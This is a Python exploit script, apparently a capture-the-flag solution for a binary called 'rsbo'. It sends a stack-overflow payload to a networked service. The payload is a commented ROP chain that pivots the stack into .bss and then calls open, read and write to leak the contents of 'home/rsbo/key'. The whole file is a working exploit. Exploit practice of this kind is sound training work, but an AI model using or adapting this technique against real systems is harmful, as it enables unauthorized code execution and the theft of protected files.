#!/usr/bin/python

import struct
import socket
import time

HOST = "10.1.35.27"
#HOST = "192.168.1.108"
PORT = 5555

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect((HOST,PORT))
time.sleep(1)

### Phase - 1
buff = "\x00"*104 									# JUNK
buff += struct.pack("<I",0x0804a040)							# BSS section address -> ebp ( by leave instruction at end of main function )
buff += struct.pack("<I",0x080483e0)							# read()
buff += struct.pack("<I",0x080484f8)							# leave ;  ret;
buff += struct.pack("<I",0x00000000)							# fd <- 0
buff += struct.pack("<I",0x0804a040)							# buf <- .bss section addr
buff += struct.pack("<I",0x1040)							# size <- 0x1040(size of bss section)

### Phase - 2
buff += struct.pack("<I",0x41414141)							# ebp = 0x41414141 esp = .bss section addr
buff += struct.pack("<I",0x08048420)							# open()
buff += struct.pack("<I",0x0804879e)							# pop ; pop ; ret;
buff += struct.pack("<I",0x080487d0)							# file <- pointer to "home/rsbo/key"
buff += struct.pack("<I",0x00000000)							# flags <- O_RDONLY
buff += struct.pack("<I",0x080483e0)							# read()
buff += struct.pack("<I",0x0804879d)							# pop ; pop ; pop ; ret
buff += struct.pack("<I",0x00000003)							# fd <- 0x3
buff += struct.pack("<I",0x0804a040 + 0x100 )						# buff <- address to store the key
buff += struct.pack("<I",64)								# size of flag
buff += struct.pack("<I",0x08048450)							# write()
buff += struct.pack("<I",0x080481aa)							# retn;
buff += struct.pack("<I",0x00000001)							# fd <- 1
buff += struct.pack("<I",0x0804a040 + 0x100 )						# buff <- stored key address in .bss section
buff += struct.pack("<I",64)								# size <- 64

buff += "\n"
fp = open("in","wb+")
fp.write(buff)
fp.close()
s.send(buff)
print "[+] Sent payload of size = "+str(len(buff))
print "[+] Payload =",''.join('\\x%02x' % ord(c) for c in buff)
time.sleep(1)
data = s.recv(1024)
print "Flag :",data
